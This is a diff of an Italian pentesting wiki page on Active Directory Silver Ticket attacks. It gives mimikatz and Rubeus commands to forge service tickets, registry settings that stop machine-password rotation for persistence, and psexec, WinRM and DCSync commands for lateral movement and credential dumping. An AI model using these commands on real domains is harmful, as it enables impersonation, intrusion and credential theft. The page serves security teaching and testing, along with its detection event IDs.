@@ -6,7 +6,11 @@
 
 ## Silver ticket
 
-L'attacco **Silver Ticket** comporta lo sfruttamento dei ticket di servizio negli ambienti Active Directory (AD). Questo metodo si basa su **acquisire l'hash NTLM di un account di servizio**, come un account computer, per forgiare un ticket del Ticket Granting Service (TGS). Con questo ticket falsificato, un attaccante può accedere a servizi specifici sulla rete, **impersonando qualsiasi utente**, tipicamente puntando a privilegi amministrativi. Si sottolinea che l'uso di chiavi AES per forgiare ticket è più sicuro e meno rilevabile.
+L'attacco **Silver Ticket** comporta lo sfruttamento dei ticket di servizio negli ambienti Active Directory (AD). Questo metodo si basa su **acquisire l'hash NTLM di un account di servizio**, come un account computer, per forgiare un ticket del Ticket Granting Service (TGS). Con questo ticket falsificato, un attaccante può accedere a servizi specifici sulla rete, **impersonando qualsiasi utente**, tipicamente puntando a privilegi amministrativi. È sottolineato che l'uso di chiavi AES per forgiare ticket è più sicuro e meno rilevabile.
+
+> [!WARNING]
+> I Silver Tickets sono meno rilevabili dei Golden Tickets perché richiedono solo l'**hash dell'account di servizio**, non l'account krbtgt. Tuttavia, sono limitati al servizio specifico che mirano. Inoltre, basta rubare la password di un utente.
+Inoltre, se comprometti la **password di un account con un SPN**, puoi usare quella password per creare un Silver Ticket impersonando qualsiasi utente per quel servizio.
 
 Per la creazione di ticket, vengono impiegati diversi strumenti in base al sistema operativo:
 
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Su Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -50,8 +59,12 @@ Utilizzando **Rubeus** puoi **richiedere tutti** questi biglietti utilizzando il
 ### ID Evento Biglietti Silver
 
 - 4624: Accesso all'Account
-- 4634: Disconnessione dall'Account
-- 4672: Accesso Amministrativo
+- 4634: Disconnessione dell'Account
+- 4672: Accesso Amministratore
+
+## Persistenza
+
+Per evitare che le macchine ruotino la loro password ogni 30 giorni, imposta `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oppure puoi impostare `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` a un valore maggiore di 30 giorni per indicare il periodo di rotazione quando la password della macchina dovrebbe essere ruotata.
 
 ## Abuso dei Biglietti di Servizio
 
@@ -59,13 +72,13 @@ Negli esempi seguenti immaginiamo che il biglietto venga recuperato impersonando
 
 ### CIFS
 
-Con questo biglietto sarai in grado di accedere alla cartella `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una parte del file system remoto semplicemente facendo qualcosa come:
+Con questo biglietto sarai in grado di accedere alle cartelle `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una parte del file system remoto semplicemente facendo qualcosa come:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Sarai anche in grado di ottenere una shell all'interno dell'host o eseguire comandi arbitrari utilizzando **psexec**:
+Potrai anche ottenere una shell all'interno dell'host o eseguire comandi arbitrari utilizzando **psexec**:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -105,11 +118,11 @@ Trova **ulteriori informazioni su wmiexec** nella seguente pagina:
 
 ### HOST + WSMAN (WINRM)
 
-Con l'accesso winrm a un computer puoi **accedervi** e persino ottenere un PowerShell:
+Con accesso winrm su un computer puoi **accedervi** e persino ottenere un PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Controlla la seguente pagina per apprendere **altri modi per connettersi a un host remoto utilizzando winrm**:
+Controlla la seguente pagina per apprendere **ulteriori modi per connettersi a un host remoto utilizzando winrm**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
@@ -126,14 +139,16 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 ```
 **Scopri di più su DCSync** nella seguente pagina:
 
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+
 ## Riferimenti
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{{#ref}}
-dcsync.md
-{{#endref}}
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
